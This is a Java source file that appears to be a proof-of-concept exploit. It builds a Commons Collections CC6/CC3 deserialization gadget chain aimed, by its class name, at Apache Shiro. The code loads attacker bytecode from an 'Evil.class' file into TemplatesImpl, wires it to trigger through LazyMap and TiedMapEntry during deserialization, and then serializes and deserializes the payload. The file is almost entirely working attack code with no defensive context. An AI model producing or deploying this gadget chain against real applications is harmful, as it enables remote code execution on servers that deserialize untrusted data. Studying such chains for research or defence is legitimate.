import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC6Shiro {
    public static void main(String[] args) throws Exception {
        //CC3
        TemplatesImpl templates = new TemplatesImpl();

        Class tcls = templates.getClass();
        Field name = tcls.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "name");

//        Field tfactory = tcls.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates, new TransformerFactoryImpl());

        byte[] code = Files.readAllBytes(Paths.get("D:\\CCchain\\target\\classes\\Evil.class"));
        byte[][] codes = {code};
        Field bytecodes = tcls.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
        //CC6
        Map<Object, Object> map = new HashMap<>();
        Map lazyMap = (Map) LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);
        Map<Object, Object> hashMap = new HashMap<>();

        hashMap.put(tiedMapEntry, "value");
        lazyMap.remove(templates);

        Class cls = LazyMap.class;
        Field factory = cls.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap, invokerTransformer);

        serialize(hashMap);
        unserialize("serialized.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("serialized.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = objectInputStream.readObject();
        return obj;
    }
}
